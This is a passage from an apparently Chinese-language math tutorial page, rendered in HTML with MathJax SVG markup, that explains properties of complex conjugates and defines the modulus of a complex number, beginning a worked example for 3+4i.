401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g></g></g></svg></mjx-container>。</p></li><li><p>一个复数与其共轭根的和等于它的实部的两倍，即 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="14.579ex" height="2.283ex" role="img" focusable="false" viewBox="0 -759 6444 1009"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z"></path></g><g data-mml-node="mo" transform="translate(687.2,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mover" transform="translate(1687.4,0)"><g data-mml-node="mi" transform="translate(17.5,0)"><path data-c="1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z"></path></g><g data-mml-node="mo" transform="translate(0,374)"><path data-c="2013" d="M0 248V285H499V248H0Z"></path></g></g><g data-mml-node="mo" transform="translate(2465.2,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(3521,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(4021,0)"><g data-mml-node="mi"><path data-c="52" d="M130 622Q123 629 119 631T103 634T60 637H27V683H202H236H300Q376 683 417 677T500 648Q595 600 609 517Q610 512 610 501Q610 468 594 439T556 392T511 361T472 343L456 338Q459 335 467 332Q497 316 516 298T545 254T559 211T568 155T578 94Q588 46 602 31T640 16H645Q660 16 674 32T692 87Q692 98 696 101T712 105T728 103T732 90Q732 59 716 27T672 -16Q656 -22 630 -22Q481 -16 458 90Q456 101 456 163T449 246Q430 304 373 320L363 322L297 323H231V192L232 61Q238 51 249 49T301 46H334V0H323Q302 3 181 3Q59 3 38 0H27V46H60Q102 47 111 49T130 61V622ZM491 499V509Q491 527 490 539T481 570T462 601T424 623T362 636Q360 636 340 636T304 637H283Q238 637 234 628Q231 624 231 492V360H289Q390 360 434 378T489 456Q491 467 491 499Z"></path><path data-c="65" d="M28 218Q28 273 48 318T98 391T163 433T229 448Q282 448 320 430T378 380T406 316T415 245Q415 238 408 231H126V216Q126 68 226 36Q246 30 270 30Q312 30 342 62Q359 79 369 104L379 128Q382 131 395 131H398Q415 131 415 121Q415 117 412 108Q393 53 349 21T250 -11Q155 -11 92 58T28 218ZM333 275Q322 403 238 411H236Q228 411 220 410T195 402T166 381T143 340T127 274V267H333V275Z" transform="translate(736,0)"></path></g></g><g data-mml-node="mo" transform="translate(5201,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(5590,0)"><path data-c="1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z"></path></g><g data-mml-node="mo" transform="translate(6055,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>。</p></li><li><p>一个复数与其共轭根的差等于它的虚部的两倍，即 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="15.391ex" height="2.283ex" role="img" focusable="false" viewBox="0 -759 6803 1009"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z"></path></g><g data-mml-node="mo" transform="translate(687.2,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mover" transform="translate(1687.4,0)"><g data-mml-node="mi" transform="translate(17.5,0)"><path data-c="1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z"></path></g><g data-mml-node="mo" transform="translate(0,374)"><path data-c="2013" d="M0 248V285H499V248H0Z"></path></g></g><g data-mml-node="mo" transform="translate(2465.2,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(3521,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mi" transform="translate(4021,0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(4366,0)"><g data-mml-node="mi"><path data-c="49" d="M328 0Q307 3 180 3T32 0H21V46H43Q92 46 106 49T126 60Q128 63 128 342Q128 620 126 623Q122 628 118 630T96 635T43 637H21V683H32Q53 680 180 680T328 683H339V637H317Q268 637 254 634T234 623Q232 620 232 342Q232 63 234 60Q238 55 242 53T264 48T317 46H339V0H328Z"></path><path data-c="6D" d="M41 46H55Q94 46 102 60V68Q102 77 102 91T102 122T103 161T103 203Q103 234 103 269T102 328V351Q99 370 88 376T43 385H25V408Q25 431 27 431L37 432Q47 433 65 434T102 436Q119 437 138 438T167 441T178 442H181V402Q181 364 182 364T187 369T199 384T218 402T247 421T285 437Q305 442 336 442Q351 442 364 440T387 434T406 426T421 417T432 406T441 395T448 384T452 374T455 366L457 361L460 365Q463 369 466 373T475 384T488 397T503 410T523 422T546 432T572 439T603 442Q729 442 740 329Q741 322 741 190V104Q741 66 743 59T754 49Q775 46 803 46H819V0H811L788 1Q764 2 737 2T699 3Q596 3 587 0H579V46H595Q656 46 656 62Q657 64 657 200Q656 335 655 343Q649 371 635 385T611 402T585 404Q540 404 506 370Q479 343 472 315T464 232V168V108Q464 78 465 68T468 55T477 49Q498 46 526 46H542V0H534L510 1Q487 2 460 2T422 3Q319 3 310 0H302V46H318Q379 46 379 62Q380 64 380 200Q379 335 378 343Q372 371 358 385T334 402T308 404Q263 404 229 370Q202 343 195 315T187 232V168V108Q187 78 188 68T191 55T200 49Q221 46 249 46H265V0H257L234 1Q210 2 183 2T145 3Q42 3 33 0H25V46H41Z" transform="translate(361,0)"></path></g></g><g data-mml-node="mo" transform="translate(5560,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(5949,0)"><path data-c="1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z"></path></g><g data-mml-node="mo" transform="translate(6414,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>。</p></li></ol><p>共轭根在复数运算和分析中具有重要的应用，例如用于求解复数的模、幅角、逆元等。</p><h2 id="复数的模"><a href="#复数的模" class="headerlink" title="复数的模"></a>复数的模</h2><p>在复数 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.186ex;" xmlns="http://www.w3.org/2000/svg" width="9.783ex" height="1.756ex" role="img" focusable="false" viewBox="0 -694 4324 776"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z"></path></g><g data-mml-node="mo" transform="translate(742.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(1798.6,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mo" transform="translate(2549.8,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mi" transform="translate(3550,0)"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g><g data-mml-node="mi" transform="translate(3979,0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g></g></svg></mjx-container> 中，<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.023ex;" xmlns="http://www.w3.org/2000/svg" width="1.197ex" height="1.02ex" role="img" focusable="false" viewBox="0 -441 529 451"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g></g></g></svg></mjx-container> 和 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="0.971ex" height="1.595ex" role="img" focusable="false" viewBox="0 -694 429 705"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g></g></g></svg></mjx-container> 分别表示其实部和虚部，<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="0.781ex" height="1.52ex" role="img" focusable="false" viewBox="0 -661 345 672"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g></g></svg></mjx-container> 表示虚数单位。复数的模（Modulus）表示复数到原点的距离，即：</p><p><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.564ex;" xmlns="http://www.w3.org/2000/svg" width="14.543ex" height="3.085ex" role="img" focusable="false" viewBox="0 -1114.2 6428.1 1363.7"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo" transform="translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="mi" transform="translate(278,0)"><path data-c="1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z"></path></g><g data-mml-node="mo" transform="translate(743,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="mo" transform="translate(1298.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msqrt" transform="translate(2354.6,0)"><g transform="translate(1020,0)"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mn" transform="translate(562,289) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(1187.8,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="msup" transform="translate(2188,0)"><g data-mml-node="mi"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g><g data-mml-node="mn" transform="translate(462,289) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g></g><g data-mml-node="mo" transform="translate(0,204.2)"><path data-c="221A" d="M263 249Q264 249 315 130T417 -108T470 -228L725 302Q981 837 982 839Q989 850 1001 850Q1008 850 1013 844T1020 832V826L741 243Q645 43 540 -176Q479 -303 469 -324T453 -348Q449 -350 436 -350L424 -349L315 -96Q206 156 205 156L171 130Q138 104 137 104L111 130L263 249Z"></path></g><rect width="3053.6" height="60" x="1020" y="994.2"></rect></g></g></g></svg></mjx-container></p><p>例如，对于复数 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.186ex;" xmlns="http://www.w3.org/2000/svg" width="9.878ex" height="1.717ex" role="img" focusable="false" viewBox="0 -677 4366 759"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z"></path></g><g data-mml-node="mo" transform="translate(742.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(1798.6,0)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path></g><g data-mml-node="mo" transform="translate(2520.8,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mn" transform="translate(3521,0)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g><g data-mml-node="mi" transform="translate(4021,0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g></g></svg></mjx-container>，其模为：</p><p><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.564ex;" xmlns="http://www.w3.org/2000/svg" width="37.102ex" height="3.085ex" role="img" focusable="false" viewBox="0 -1114.2 16399.2 1363.7"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo" transform="translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="mi" transform="translate(278,0)"><path data-c="1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 